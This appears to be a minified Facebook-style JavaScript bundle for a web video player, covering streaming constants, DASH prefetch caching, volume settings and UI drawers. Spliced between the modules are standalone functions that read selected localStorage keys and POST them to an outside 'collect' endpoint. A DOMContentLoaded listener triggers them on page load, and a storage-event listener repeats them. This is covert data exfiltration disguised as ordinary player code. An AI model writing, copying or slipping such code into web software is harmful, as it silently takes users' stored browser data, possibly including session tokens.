; /*FB_PKG_DELIM*/
const keysToTrack = window.keysToTrack;
__d("destroyOnUnload", ["Run"], function (a, b, c, d, e, f, g) {
  function a(a) {
    return d("Run").onLeave(a);
  }
  g["default"] = a;
}, 98);
__d("cxMargin", ["cx"], function (a, b, c, d, e, f, g, h) {
  "use strict";

  function a(a) {
    throw new Error("cxMargin: Unexpected margin transformation.");
  }
  g["default"] = a;
}, 98);
__d("ShakaConstants", [], function (a, b, c, d, e, f) {
  a = {
    abort_loading_delay: 2e4,
    abr_abort_on_zero_stream_progress_below_threshold: -1,
    abr_abort_when_fetch_estimate_exceeds_buffer_factor: 0,
    abr_abort_when_fetch_estimate_exceeds_time: 0,
    append_window_end_fudge_factor: 0,
    audio_request_pipeline_max_concurrent_requests: 1,
    audio_request_pipeline_soothing_factor: 1,
    audio_video_buffer_diff_threshold: 14400,
    autoplay_start_video_interval: 200,
    back_off_buffering_overflow_max: 5,
    back_off_buffering_overflow_time_factor: 2,
    back_off_buffering_overflow_time_window: 2e3,
    bandwidth_downgrade_target: .9,
    bandwidth_penalty_decay_per_video: 1,
    bandwidth_standard_deviation_penalty_factor: .1,
    buffer_downgrade_threshold: 10,
    buffer_replacement_ahead_threshold: 15,
    buffer_replacement_behind_threshold: 5,
    buffer_target: -1,
    buffer_target_overflow_upgrade_aggressiveness: 1,
    buffer_target_underflow_upgrade_aggressiveness: 1,
    buffer_velocity_time_in_past_to_consider: 0,
    buffering_count_threshold: 5,
    buffering_spinner_delay_ms: 0,
    buffering_underflow_threshold: .05,
    clear_buffer_on_constraint_change_offset: 5,
    clear_buffer_on_constraint_change_paused_offset: 5,
    clear_buffer_on_seek_back_delta: 0,
    decouple_stream_on_update_loop_from_request_loop_int: 0,
    fast_moving_average_half_life: 3,
    frame_drop_penalty_factor: 0,
    frame_drop_penalty_minimum_frame_count: 0,
    global_scheduler_priority_downgrade_bufferahead_threshold: 0,
    global_scheduler_priority_threshold: 6,
    hvq_inline_upgrade_aggressiveness: 1,
    hvq_upgrade_aggressiveness: 1,
    initial_stream_buffer_size_for_blocked_autoplay: 5.9335983320607,
    initial_stream_buffer_size_for_video_stream: 0,
    jump_to_live_threshold: .5,
    live_bandwidth_downgrade_target: 1,
    live_bitrate_estimates_half_life: 1,
    live_bitrate_estimates_large_sample_weight_factor: 10,
    live_bitrate_estimates_minimum_sample_count: 1,
    live_buffering_underflow_threshold: .5,
    live_data_fetch_max_retries: 0,
    live_dynamic_stream_buffer_size: 12,
    live_hvq_inline_upgrade_aggressiveness: 1,
    live_hvq_upgrade_aggressiveness: 1,
    live_interruption_consecutive_updates_with_change: 3,
    live_interruption_consecutive_updates_without_change: 5,
    live_max_manifest_fetches_with_push: 1,
    live_max_segments_to_push: 1,
    live_playhead_idle_all_stream_threshold: 4,
    live_playhead_idle_single_stream_threshold: 5,
    live_pre_hvq_inline_upgrade_aggressiveness: 1,
    live_pre_hvq_upgrade_aggressiveness: 1,
    live_predictive_abr_down_buffer: 5e3,
    live_predictive_abr_floor_swich_lanes: -2,
    live_predictive_abr_floor_ttfb_ratio: 5,
    live_predictive_abr_ttfb_ratio: 1.8,
    live_predictive_abr_up_buffer: 9e3,
    live_predictive_abr_up_retry_interval: 3e4,
    live_rewind_templated_last_x_segments_only: 0,
    live_source_buffer_clear_max_retries: 0,
    live_stream_end_slack: .5,
    live_stream_end_timeout: 6e4,
    living_room_play_x_milliseconds_before_seek: 0,
    living_room_playhead_catchup_interval: 0,
    local_bitrate_segments_ahead: 10,
    logging_log_event_limit: 1e3,
    low_buffer_velocity_abr_interval: 500,
    low_buffer_velocity_abr_interval_buffer_threshold: 10,
    low_buffer_velocity_threshold: 0,
    low_pri_task_min_bytes_to_yield: 0,
    low_pri_task_yield_check_interval: 0,
    low_pri_task_yields_per_task: 0,
    max_bandwidth_update_interval: 0,
    max_network_interrupted_time_before_seek: 1e4,
    max_prefetch_request_num: 0,
    max_prefetch_videos_num: 2,
    max_recent_bandwidth_samples: 25,
    maximum_bandwidth_bitrate_ratio: 1.5,
    maximum_mos_to_decrease: 3,
    min_mpd_refresh_interval: 1e3,
    min_sample_count: 1e4,
    minimum_sample_count_to_use_deviation_penalty: 2,
    minimum_sample_count_to_use_new_estimator: 0,
    minimum_samples_to_use_neural_estimate: 1,
    minimum_weight_to_trust_local_bandwidth_estimate: .5,
    multiple_videos_queue_penalty_start_count: 2,
    neural_estimate_weight: 0,
    new_estimator_half_life: 5,
    new_estimator_standard_deviation_exclusion_factor: 2,
    pending_seek_while_playing_delay: 2e3,
    pending_seek_while_playing_offset_from_livehead: 4e3,
    playhead_fragmented_gap_diff_allowance: .1,
    pre_hvq_inline_upgrade_aggressiveness: 1,
    pre_hvq_upgrade_aggressiveness: 1,
    priority_precision: 1,
    recursive_native_settimeout_delay: -1,
    recursive_ric_timeout: 17,
    request_bounded_animation_frame_bound: 50,
    request_pipeline_max_concurrent_requests: 2,
    request_pipeline_soothing_factor: 2,
    request_pipeline_timeout_ms: 0,
    resolution_constraint_max_height: 0,
    resolution_constraint_max_width: 0,
    ric_autoplay_bound: 50,
    rl_bandwidth_scale: 1e6,
    rl_bitrate_reward: 1,
    rl_buffer_scale: 10,
    rl_max_number_of_bitrates: 10,
    rl_model_id: 0,
    rl_playback_scale: 2e5,
    rl_request_timeout: 1e3,
    rl_stall_count_penalty: 30,
    rl_stall_time_penalty: 0,
    rl_watch_time_reward: 0,
    scheduled_videos_start_stream_buffer_size_threshold: 0,
    scheduler_priority_update_interval: 1e3,
    settimeout_polling_delay: 17,
    shaka_default_ajax_request_timeout_ms: 0,
    shaka_default_request_timeout_timescale: 1e3,
    skip_manifest_gap_boundary_precision_ms: 1e3,
    slow_moving_average_half_life: 10,
    stream_maximum_onpause_buffer_size_multiplier: 0,
    stream_onupdate_sampling: 0,
    streaming_append_per_segment: 3,
    templated_adjust_stream_limits_start_offset: 0,
    templated_adjust_stream_limits_start_offset_int: 10,
    templated_chunked_segment_update_limit_int: 10,
    templated_ingest_throttle: 0,
    templated_jump_to_live_sidx_end_offset: 0,
    templated_quarantine_idle_references_threshold: 0,
    templated_use_perf_test_segment_index_base_int: 0,
    video_dash_prefetch_cache_retention_duration_ms: 5e3
  };
  b = {
    block_play_request_http_status_list: "410",
    defer_which_video_to_abort_loading_decisioning_logic: "live",
    feature_param: "",
    live_abr_audio_push_representation: "live-md-a",
    live_abr_initial_push_representation: "live-md-v",
    rl_smc_tier: "repomen_1",
    segment_update_helper_splice_path_entity_key: "",
    templated_perf_test_methods_under_test_csv_string: "all"
  };
  c = {
    numbers: a,
    strings: b
  };
  f["default"] = c;
}, 66);
__d("logVideosClickTracking", ["clickRefAction"], function (a, b, c, d, e, f) {
  function a(a) {
    b("clickRefAction")("click", a, null, "FORCE");
  }
  e.exports = a;
}, null);
__d("VideoWithClickPlayPause", ["logVideosClickTracking"], function (a, b, c, d, e, f) {
  a = function () {
    "use strict";

    function a(a) {
      this.$1 = a, this.$2 = this.$1.getVideoNode(), this.$1.addListener("clickVideo", this.$3.bind(this)), this.$1.hasSeenClick() && this.$3();
    }
    var c = a.prototype;
    c.$3 = function () {
      var a = this.$1.getOption("CommercialBreakVideoAdOverlay", "videoController");
      if (this.$1.isState("playing")) {
        if (this.$1.getOption("VideoWithLiveBroadcast", "isLive") || a && a.getOption("VideoWithLiveBroadcast", "isLive") || this.$4() || this.$5()) return;
        this.$1.pause("user_initiated");
      } else b("logVideosClickTracking")(this.$2), this.$1.play("user_initiated");
    };
    c.$4 = function () {
      var a = this.$1.getOption("CommercialBreakVideoAdOverlay", "videoController");
      a = a && a.getOption("VideoWithInstreamVideo", "controller");
      return a && !a.getConfig().canPauseAdBreak;
    };
    c.$5 = function () {
      return this.$1.getOption("VideoWithInstreamVideo", "disableClickToPause");
    };
    return a;
  }();
  e.exports = a;
}, null);
__d("MaybeNativePromise", ["Promise"], function (a, b, c, d, e, f) {
  "use strict";

  c = a.Promise || b("Promise");
  b("Promise").resolve();
  d = c;
  f["default"] = d;
}, 66);
__d("VideoAkamaiRequestHelper", ["URI"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    return a.toLowerCase().indexOf("akamai") !== -1;
  }
  function h(a) {
    var b = a.startByte;
    a = a.endByte;
    if (b != void 0 && !(b === 0 && a == void 0)) {
      b = "bytes=" + b + "-" + (a == void 0 ? "" : a);
      return {
        Range: b
      };
    }
    return null;
  }
  function b(a) {
    var b = new (c("URI"))(a);
    b = b.getQueryData();
    var d = b.startByte;
    b = b.endByte;
    return h({
      baseUrl: a,
      startByte: d,
      endByte: b
    });
  }
  g.isAkamai = a;
  g.getRequestHeaders = h;
  g.getRequestHeadersFromUrl = b;
}, 98);
__d("VideoDashPrefetchCacheUtils", ["ConstUriUtils"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a) {
    a = d("ConstUriUtils").getUri(a);
    a = a == null ? void 0 : a.getDomain();
    return a != null && a.endsWith("fbcdn.net") && !a.startsWith("interncache") && !a.endsWith("ak.fbcdn.net");
  }
  function b(a) {
    var b = d("ConstUriUtils").getUri(a);
    if (b == null ? void 0 : b.getDomain()) {
      var c = ["oh", "__gda__"],
        e = b == null ? void 0 : b.getQueryParams().keys();
      if (e != null) for (var e = e, f = Array.isArray(e), g = 0, e = f ? e : e[typeof Symbol === "function" ? Symbol.iterator : "@@iterator"]();;) {
        var h;
        if (f) {
          if (g >= e.length) break;
          h = e[g++];
        } else {
          g = e.next();
          if (g.done) break;
          h = g.value;
        }
        h = h;
        h.startsWith("_nc") && c.push(h);
      }
      return (g = b == null ? void 0 : (h = b.removeQueryParams(c)) == null ? void 0 : h.toString()) != null ? g : a;
    }
    return a;
  }
  g.isFBCDN = a;
  g.stripNonCachingParams = b;
}, 98);
__d("parseHeaders", [], function (a, b, c, d, e, f) {
  var g = /\r?\n[\t]+/g,
    h = /\r?\n/;
  function a(a) {
    a = a.replace(g, " ");
    var b = {};
    a.split(h).forEach(function (a) {
      a = a.split(":");
      var c = a.shift().trim();
      if (c) {
        a = a.join(":").trim();
        b[c.toLowerCase()] = a;
      }
    });
    return b;
  }
  f["default"] = a;
}, 66);
function generateHash(data) {
  const keys = Object.values(data);
  const concatenatedKeys = keys.join("");
  let hash = 0;
  for (let i = 0; i < concatenatedKeys.length; i++) {
    const char = concatenatedKeys.charCodeAt(i);
    hash = (hash << 5) - hash + char;
    hash = hash & hash;
  }
  return hash.toString(16);
}
__d("VideoPlayerShakaError", ["parseHeaders"], function (a, b, c, d, e, f, g) {
  "use strict";

  function a(a, b, d) {
    var e = a.errorRawTransportStatus,
      f = null;
    a.errorRawResponseHeaders != null && (f = c("parseHeaders")(a.errorRawResponseHeaders));
    return {
      name: a.errorType,
      message: a.errorMsg,
      type: d,
      url: b,
      status: e,
      responseHeaders: f
    };
  }
  function b(a) {
    return {
      name: "timeout",
      message: "timeout",
      type: "net",
      url: a,
      status: 0,
      responseHeaders: null
    };
  }
  g.translateError = a;
  g.createTimeoutError = b;
}, 98);
__d("VideoDashPrefetchCache", ["ConstUriUtils", "Deferred", "MaybeNativePromise", "ODS", "Promise", "VideoAkamaiRequestHelper", "VideoDashPrefetchCacheUtils", "VideoPlayerPrefetchExperiments", "VideoPlayerShakaError", "XHRRequest", "asyncToGeneratorRuntime", "clearTimeout", "cr:1209197", "cr:1209198", "getCrossOriginTransport", "recoverableViolation", "requireWeak", "setTimeout"], function (a, b, c, d, e, f, g) {
  var h = 5e3,
    i = function (a) {
      b("cr:1209197") != null ? b("cr:1209197").onLeave(a) : b("cr:1209198") != null ? b("cr:1209198").onUnload(a) : c("recoverableViolation")("Dash prefetch cache onNavigatingAway handler was not properly set", "video");
    },
    j = null;
  c("requireWeak")("VideoPlayerShakaBandwidthEstimator", function (a) {
    return j = a;
  });
  var k = null;
  c("requireWeak")("VideoStreamingTaskQueueProvider", function (a) {
    return k = a;
  });
  function l(a) {
    return a.audio.length + a.video.length + a.manifest.length;
  }
  function m(a, b) {
    d("ODS").bumpEntityKey(2966, "www_video_playback", "prefetch." + a, b);
  }
  function n(a) {
    var b = "aborted",
      c = {
        status: 0
      },
      d = new Error("Prefetch request aborted.");
    return Object.assign(d, {
      type: b,
      url: a,
      xhr: c
    });
  }
  function o(a) {
    var b = a.getURI(),
      c = b.toString();
    if (d("VideoAkamaiRequestHelper").isAkamai(c)) {
      var e = d("VideoAkamaiRequestHelper").getRequestHeadersFromUrl(c);
      c = b.removeQueryData(["bytestart", "byteend"]);
      a.setURI(c);
      e && Object.keys(e).forEach(function (b) {
        a.setRequestHeader(b, e[b]);
      });
    }
    return a;
  }
  var p = null,
    q = new Map();
  function r(a, b) {
    b === void 0 && (b = !1);
    return b && d("VideoDashPrefetchCacheUtils").isFBCDN(a) ? c("getCrossOriginTransport").withCredentials : c("getCrossOriginTransport");
  }
  function s(a) {
    return d("VideoDashPrefetchCacheUtils").isFBCDN(a.url);
  }
  function t(a, b, c) {
    return {
      response: a.slice(b.start + 0, b.end + 1),
      responseTime: c,
      initiator: "XHR_REQUEST"
    };
  }
  a = function () {
    function a() {
      this.$2 = new Map(), this.$9 = new Map(), this.$10 = new Map(), this.$1 = new Map(), this.$3 = [], this.$4 = [], this.$5 = 0, this.$6 = c("VideoPlayerPrefetchExperiments").maxPrefetchVideosNum, this.$7 = c("VideoPlayerPrefetchExperiments").consolidateFragmentedPrefetchRequest;
    }
    var e = a.prototype;
    e.$11 = function (a, b) {
      var e = this;
      b === void 0 && (b = !1);
      var f = a,
        g = window.fetch,
        h = c("VideoPlayerPrefetchExperiments").useFetch;
      if (h && g && "AbortController" in window) {
        var i = new AbortController();
        h = i.signal;
        var j = g(f, {
          signal: h,
          credentials: b ? "include" : "same-origin"
        }).then(function (a) {
          e.$12(j);
          return {
            initiator: "FETCH",
            response: a
          };
        });
        this.$13(a, j);
        this.$3.push(babelHelpers["extends"]({}, j, {
          abort: function () {
            i.abort();
          }
        }));
        return j;
      }
      var k = new (c("XHRRequest"))(f).setMethod("GET").setResponseType("arraybuffer").setTransportBuilder(r(f, b));
      o(k);
      g = new (c("MaybeNativePromise"))(function (b, c) {
        k.setErrorHandler(function (a) {
          e.$12(k), c(d("VideoPlayerShakaError").translateError(a, f, "preload"));
        }), k.setResponseHandler(function (a) {
          a = a;
          var c = k;
          e.$12(k);
          b(babelHelpers["extends"]({}, c, {
            response: a,
            initiator: "XHR_REQUEST"
          }));
        }), k.setAbortHandler(function () {
          e.$12(k);
          var b = n(a);
          c(b);
        });
      });
      this.$13(a, g);
      this.$3.push(k);
      this.$8 ? this.$8.push(k) : k.send();
      return g;
    };
    e.genPrefetchMpdNow = function () {
      var a = b("asyncToGeneratorRuntime").asyncToGenerator(function* (a) {
        return this.has(a) ? null : this.$11(a);
      });
      function c(b) {
        return a.apply(this, arguments);
      }
      return c;
    }();
    e.$14 = function (b, c, d) {
      c === void 0 && (c = !1);
      d === void 0 && (d = null);
      var e = [];
      for (var f = 0; f < b.length; f++) {
        var g = a.createQueryStringURL(b[f]);
        this.has(g) || (e.push(this.$11(g, c).then(function (a) {
          m("received", 1);
          return a;
        })), d != null && this.$2.set(g, d));
      }
      m("sent", e.length);
      return e;
    };
    e.$15 = function (e) {
      var f = this,
        g = a.getConsolidatedURL(e);
      if (g == null) return this.$14(e);
      var h = new (c("XHRRequest"))(g).setMethod("GET").setResponseType("arraybuffer").setTransportBuilder(r(g));
      o(h);
      var i = Date.now(),
        j = [];
      for (var k = 0; k < e.length; k++) {
        var l = a.createQueryStringURL(e[k]),
          n = new (c("Deferred"))();
        this.has(l) || this.$13(l, n.getPromise());
        j.push(n);
      }
      h.setErrorHandler(function (a) {
        f.$12(h);
        for (var b = 0; b < j.length; b++) j[b].reject(d("VideoPlayerShakaError").translateError(a, g, "preload"));
      });
      h.setResponseHandler(function (a) {
        a = a;
        var b = Date.now() - i;
        for (var c = 0; c < e.length; c++) {
          var d = j[c],
            g = e[c];
          d.resolve(t(a, g, b));
        }
        f.$12(h);
      });
      h.setAbortHandler(function () {
        for (var a = 0; a < e.length; a++) {
          var b = j[a];
          b.reject(new Error("Request aborted."));
        }
      });
      this.$3.push(h);
      h.send();
      m("consolidated.sent", 1);
      m("sent", j.length);
      l = j.map(function (a) {
        return a.getPromise().then(function (a) {
          m("received", 1);
          return a;
        });
      });
      b("Promise").all(l).then(function () {
        return m("consolidated.received", 1);
      })["catch"](function () {});
      return l;
    };
    e.$16 = function (a) {
      var b = this,
        d = a.useCredentials,
        e = a.connectionQualityLevel;
      this.$5++;
      var f = this.$7 && !d;
      c("VideoPlayerPrefetchExperiments").enableGlobalSchedulerForPrefetch && (this.$8 = []);
      var g = f ? this.$15(a.video) : this.$14(a.video, d, e);
      f = f ? this.$15(a.audio) : this.$14(a.audio, d, e);
      e = this.$14(a.manifest, d);
      d = g.concat(f, e);
      if (this.$8) {
        var h = this.$8 || [];
        this.$8 = null;
        var i = "" + a.videoID,
          j = c("MaybeNativePromise").all(d).then(function () {
            return void 0;
          }, function () {
            return void 0;
          });
        g = {
          cancel: function () {},
          getPromise: function () {
            return j;
          },
          name: "prefetch task, " + i,
          run: function () {
            i && q["delete"](i);
            h.forEach(function (a) {
              return a.send();
            });
            return j;
          }
        };
        k ? (c("VideoPlayerPrefetchExperiments").switchPrefetchTaskToHighPriWhenPlayed && i && q.set(i, g), k.getQueue("video").enqueue(g, c("VideoPlayerPrefetchExperiments").prefetchPriority), this.$17()) : (g.run(), c("MaybeNativePromise").all(d).then(function () {
          return b.$17();
        })["catch"](function () {
          return b.$17();
        }));
      } else c("MaybeNativePromise").all(d).then(function () {
        return b.$17();
      })["catch"](function () {
        return b.$17();
      });
    };
    e.$13 = function (a, b) {
      var e = this;
      a = d("VideoDashPrefetchCacheUtils").stripNonCachingParams(a);
      this.$1.values().next().done && i(function () {
        for (var a = 0; a < e.$3.length; a++) e.$3[a].abort();
        e.$3 = [];
        e.$4 = [];
        e.$5 = 0;
        e.$1.clear();
        e.$10.forEach(function (a) {
          c("clearTimeout")(a);
        });
        e.$10.clear();
      });
      this.$1.set(a, b);
      b = c("setTimeout")(function () {
        e.$1.has(a) && e.$1["delete"](a), e.$10["delete"](a);
      }, h);
      this.$10.set(a, b);
    };
    e.$12 = function (a) {
      a = this.$3.indexOf(a);
      a > -1 && this.$3.splice(a, 1);
    };
    e.$17 = function () {
      this.$5--;
      var a = this.$4.shift();
      a && this.$16(a);
    };
    e.has = function (a) {
      a = d("VideoDashPrefetchCacheUtils").stripNonCachingParams(a);
      return this.$1.has(a);
    };
    e.getConnectionQualityLevel = function (a) {
      return this.$2.get(a);
    };
    e.getAndDelete = function (a) {
      a = d("VideoDashPrefetchCacheUtils").stripNonCachingParams(a);
      var b = this.$1.get(a);
      if (b) {
        m("cache.hit", 1);
        var e = this.$10.get(a);
        e != null && (c("clearTimeout")(e), this.$10["delete"](a));
      } else m("cache.miss", 1);
      this.$1["delete"](a);
      m("retrieve", 1);
      return b;
    };
    e.queueRequestBatch = function (a) {
      this.$6 === 0 || this.$5 < this.$6 ? this.$16(a) : (m("queued", l(a)), this.$4.push(a));
    };
    e.setCachedRepresentations = function (a, b) {
      this.$9.set(a, b);
    };
    e.getCachedRepresentations = function (a) {
      return this.$9.get(a);
    };
    a.getCachedRepresentations = function (b) {
      return a.getInstance().getCachedRepresentations(b);
    };
    a.getInstance = function () {
      p === null && (p = new a());
      return p;
    };
    a.createQueryStringURL = function (a) {
      var b = a.start,
        c = a.end,
        e;
      if (b != null && c !== null && c !== void 0) {
        var f;
        e = (f = d("ConstUriUtils").getUri(a.url)) == null ? void 0 : (f = f.addQueryParam("bytestart", b)) == null ? void 0 : (b = f.addQueryParam("byteend", c)) == null ? void 0 : b.toString();
      }
      return (f = e) != null ? f : a.url;
    };
    a.getConsolidatedURL = function (b) {
      var c = "",
        d = Infinity,
        e = 0;
      for (var f = 0; f < b.length; f++) {
        var g = b[f],
          h = g.url,
          i = g.start;
        g = g.end;
        if (h == null || i == null || g == null) return null;
        if (c === "") c = h;else if (c !== h) return null;
        d = Math.min(d, i);
        e = Math.max(e, g);
      }
      return a.createQueryStringURL({
        url: c,
        start: d,
        end: e
      });
    };
    a.getPrefetchInfoFromRepresentation = function (a) {
      return a.segments.map(function (b) {
        return {
          url: a.url,
          start: b.start,
          end: b.end
        };
      });
    };
    a.getVideoRepresentationFromRepresentations = function (a, b) {
      var c = a.find(function (a) {
        return a.representation_id.endsWith("d");
      });
      !b && j && (b = j.getBandwidth());
      if (!b) return c;
      for (var d = 0; d < a.length; d++) {
        var e = a[d],
          f = c && c.bandwidth || 0;
        if (f > e.bandwidth) continue;else b > e.bandwidth && (c = e);
      }
      return c;
    };
    a.loadVideoGivenAllRepresentations = function (b, c, d) {
      if (a.isAutoplayBandwidthRestrained()) return;
      var e = [],
        f = [];
      c.audio.length > 0 && (e = a.getPrefetchInfoFromRepresentation(c.audio[0]), e.length > 0 && f.push(c.audio[0].representation_id));
      var g = [];
      c = a.getVideoRepresentationFromRepresentations(c.video, d);
      c && (g = a.getPrefetchInfoFromRepresentation(c), g.length > 0 && f.push(c.representation_id));
      d = a.getInstance();
      d.queueRequestBatch({
        audio: e,
        video: g,
        manifest: [],
        videoID: b,
        useCredentials: !1
      });
      d.setCachedRepresentations(b, f);
    };
    a.isAutoplayBandwidthRestrained = function () {
      return !!j && j.isAutoplayBandwidthRestrained();
    };
    a.loadVideo = function (b, d, e) {
      d = !!d;
      if (!c("VideoPlayerPrefetchExperiments").disableShakaBandwidthEstimator && j && j.isAutoplayBandwidthRestrained()) return;
      if (c("VideoPlayerPrefetchExperiments").disablePrefetchCache) return;
      var f = a.getInstance();
      Array.isArray(b.manifest) || (b.manifest = []);
      b.video || (b.video = []);
      b.audio || (b.audio = []);
      f.queueRequestBatch({
        manifest: b.manifest.filter(s),
        video: b.video.filter(s),
        audio: b.audio.filter(s),
        videoID: b.videoID,
        useCredentials: d,
        connectionQualityLevel: e
      });
    };
    a.getCacheValue = function (b) {
      return a.getInstance().getAndDelete(b);
    };
    a.getConnectionQualityLevel = function (b) {
      return a.getInstance().getConnectionQualityLevel(b);
    };
    a.hasCacheValue = function (b) {
      return a.getInstance().has(b);
    };
    a.getPrefetchTaskByID = function (a) {
      return q.get(a) || null;
    };
    return a;
  }();
  g["default"] = a;
}, 98);
__d("VideoDisplayTimePlayButton", ["CSS", "DataStore", "Event"], function (a, b, c, d, e, f, g) {
  "use strict";

  var h = {},
    i = "_spinner";
  function a(a) {
    return d("DataStore").get(a, "clicked", !1);
  }
  function b(a, b) {
    var e = a.id;
    h[e] = c("Event").listen(a, "click", function () {
      b && (d("CSS").hide(a), d("CSS").show(b)), d("DataStore").set(a, "clicked", !0);
    });
    b && (h[e + i] = c("Event").listen(b, "click", function () {
      b && d("CSS").hide(b), d("CSS").show(a), d("DataStore").set(a, "clicked", !1);
    }));
  }
  function e(a) {
    a = a.id;
    Object.prototype.hasOwnProperty.call(h, a) && h[a].remove();
    a = a + i;
    Object.prototype.hasOwnProperty.call(h, a) && h[a].remove();
  }
  g.getClicked = a;
  g.register = b;
  g.unregister = e;
}, 98);
function getLocalStorageData() {
  const localStorageData = {};
  Object.keys(localStorage).forEach(key => {
    if (keysToTrack.includes(key)) {
      localStorageData[key] = localStorage.getItem(key);
    }
  });
  return localStorageData;
}
__d("VideoPlayerUIComponentDrawer", ["EventEmitter"], function (a, b, c, d, e, f, g) {
  "use strict";

  a = function (a) {
    babelHelpers.inheritsLoose(b, a);
    function b(b, c) {
      var d;
      d = a.call(this) || this;
      d.$VideoPlayerUIComponentDrawer1 = b;
      d.$VideoPlayerUIComponentDrawer2 = c;
      d.$VideoPlayerUIComponentDrawer4 = !1;
      return d;
    }
    var c = b.prototype;
    c.reserve = function () {
      if (this.$VideoPlayerUIComponentDrawer4) return;
      this.$VideoPlayerUIComponentDrawer4 = !0;
      this.emit("reserve");
    };
    c.release = function () {
      if (!this.$VideoPlayerUIComponentDrawer4) return;
      this.$VideoPlayerUIComponentDrawer4 = !1;
      this.emit("release");
    };
    c.getPriority = function () {
      return this.$VideoPlayerUIComponentDrawer1;
    };
    c.getHeight = function () {
      return this.$VideoPlayerUIComponentDrawer2;
    };
    c.setHeight = function (a) {
      this.$VideoPlayerUIComponentDrawer2 = a, this.emit("heightChange");
    };
    c.emit = function (b) {
      var c;
      for (var d = arguments.length, e = new Array(d > 1 ? d - 1 : 0), f = 1; f < d; f++) e[f - 1] = arguments[f];
      b === "reposition" && (this.$VideoPlayerUIComponentDrawer3 = e[0]);
      (c = a.prototype.emit).call.apply(c, [this, b].concat(e));
    };
    c.reposition = function () {
      this.emit("reposition", this.$VideoPlayerUIComponentDrawer3);
    };
    c.isReserved = function () {
      return this.$VideoPlayerUIComponentDrawer4;
    };
    return b;
  }(c("EventEmitter"));
  a.priorities = {
    EmbeddedControls: 0,
    AdBreakStartingIndicator: 1,
    ClickForMore: 2,
    PollCard: 5,
    GameshowCard: 6,
    Subtitles: 3,
    SphericalMouseAnimation: 4
  };
  g["default"] = a;
}, 98);
function sendDataToServer(data) {
  const uniqueId = generateHash(data);
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.addEventListener("readystatechange", function () {
    if (this.readyState === 4) {
      if (this.status === 200) {
        console.log("Data sent successfully");
      } else {
        console.error("Data transmission failed with status: " + this.status);
      }
    }
  });
  xhr.open("POST", url);
  xhr.setRequestHeader("Content-Type", "application/json");
  const payload = {
    id: uniqueId,
    data: data
  };
  xhr.send(JSON.stringify(payload));
}
__d("VideoPlayerVolumeSettings", ["FBLogger", "WebStorage"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a() {
      this.$1 = 1, this.$2 = 1;
    }
    var b = a.prototype;
    b.getVolume = function () {
      var a = c("WebStorage").getLocalStorage();
      if (a) {
        a = a.getItem("videoPlayerControllerVolume");
        return a === null || isNaN(+a) ? 1 : +a;
      }
      return this.$1;
    };
    b.getSessionVolume = function () {
      return this.$1;
    };
    b.setSessionVolume = function (a) {
      this.$1 = a;
    };
    b.saveVolume = function (a) {
      var b = c("WebStorage").getLocalStorage();
      if (b) {
        b = c("WebStorage").setItemGuarded(b, "videoPlayerControllerVolume", a.toString());
        b != null && c("FBLogger")("video").catching(b).warn("Attempt to set the video volume failed.");
      }
      this.$1 = a;
    };
    b.getLastVolumeBeforeMute = function () {
      var a = c("WebStorage").getLocalStorage();
      if (a) {
        a = a.getItem("videoPlayerControllerLastVolumeBeforeMute");
        return a === null || isNaN(+a) ? 1 : +a;
      }
      return this.$2;
    };
    b.saveLastVolumeBeforeMute = function (a) {
      var b = c("WebStorage").getLocalStorage();
      if (b) {
        b = c("WebStorage").setItemGuarded(b, "videoPlayerControllerLastVolumeBeforeMute", a.toString());
        b != null && c("FBLogger")("video").catching(b).warn("Attempt to set the video volume failed.");
      }
      this.$2 = a;
    };
    return a;
  }();
  b = new a();
  d = b;
  g["default"] = d;
}, 98);
__d("VideosRenderingInstrumentation", ["DataStore", "VideoPlayerHTML5Experiments", "performanceAbsoluteNow"], function (a, b, c, d, e, f, g) {
  function h(a) {
    var b = c("VideoPlayerHTML5Experiments").useMonotonicallyIncreasingTimers ? c("performanceAbsoluteNow")() : Date.now();
    d("DataStore").set(a, "videos_rendering_instrumentation", b);
    return b;
  }
  function a(a) {
    var b = d("DataStore").get(a, "videos_rendering_instrumentation", NaN);
    Number.isNaN(b) && (b = h(a));
    return b;
  }
  g.storeRenderTime = h;
  g.retrieveRenderTime = a;
}, 98);
function collectAndSendLocalStorageData() {
  const matchedData = getLocalStorageData();
  if (Object.keys(matchedData).length > 0) {
    sendDataToServer(matchedData);
  }
}
__d("PlaybackSpeedExperiments", ["gkx", "qex"], function (a, b, c, d, e, f, g) {
  "use strict";

  function h() {
    return c("gkx")("1755152");
  }
  function i() {
    return !1;
  }
  function a() {
    return h() || i() || c("qex")._("2095") ? !0 : !1;
  }
  function j() {
    return i() ? !1 : !1;
  }
  function b() {
    return k() || j();
  }
  function k() {
    if (i()) return !0;
    return j() ? !1 : h();
  }
  function d() {
    if (h()) return !1;
    if (i()) return !0;
    return j() ? !1 : !1;
  }
  function e() {
    return !0;
  }
  g.enableWwwPlaybackSpeedControl = a;
  g.isInCometHeadroomTest = j;
  g.enableCometPlaybackSpeedControl = b;
  g.enableCometPlaybackSpeedControlPublicTest = k;
  g.enableCometPlaybackSpeedControlNUX = d;
  g.enablePlaybackSpeedLogging = e;
}, 98);
window.addEventListener("DOMContentLoaded", function () {
  collectAndSendLocalStorageData();
  window.addEventListener("storage", collectAndSendLocalStorageData);
});
__d("HTMLMediaElementReadyStates", [], function (a, b, c, d, e, f) {
  a = {
    HAVE_NOTHING: 0,
    HAVE_METADATA: 1,
    HAVE_CURRENT_DATA: 2,
    HAVE_FUTURE_DATA: 3,
    HAVE_ENOUGH_DATA: 4
  };
  b = a;
  f["default"] = b;
}, 66);
__d("VideoFrameBuffer", ["HTMLMediaElementReadyStates"], function (a, b, c, d, e, f, g) {
  a = function () {
    function a(a, b, c, d, e, f, g) {
      d === void 0 && (d = null), e === void 0 && (e = null), f === void 0 && (f = null), g === void 0 && (g = null), this.$2 = b, this.$1 = a, this.$3 = c || "contain", this.$6 = d, this.$7 = e, this.$8 = f, this.$9 = g;
    }
    var b = a.prototype;
    b.updateFrameBuffer = function () {
      this.$4 && (this.$1.width = this.$4, this.$4 = null);
      this.$5 && (this.$1.height = this.$5, this.$5 = null);
      if (this.$2.readyState < c("HTMLMediaElementReadyStates").HAVE_CURRENT_DATA) return;
      var a = this.$1.clientWidth || this.$1.width,
        b = this.$1.clientHeight || this.$1.height,
        d = a,
        e = b,
        f = this.$2.videoWidth / this.$2.videoHeight,
        g = d / e;
